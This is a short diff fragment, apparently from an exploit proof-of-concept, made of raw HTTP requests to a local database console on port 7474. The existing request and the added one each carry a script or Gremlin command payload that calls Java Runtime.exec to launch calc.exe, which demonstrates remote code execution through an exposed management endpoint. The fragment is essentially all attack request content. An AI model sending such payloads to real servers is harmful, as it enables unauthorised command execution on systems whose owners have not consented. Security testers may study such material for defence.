@@ -16,3 +16,14 @@ Content-Type: application/json
 Content-Length: 117
  
 {"script":"import java.lang.Runtime;rt = Runtime.getRuntime().exec(\"c:/Windows/System32/calc.exe\")", "params": {} }
+
+
+
+
+http://localhost:7474/db/manage/server/console/
+
+Accept: application/json, text/javascript, */*
+Host: localhost:7474
+Content-Length: 98
+
+{"command":"rt = Runtime.getRuntime().exec(\"c:/Windows/System32/calc.exe\");","engine":"gremlin"}
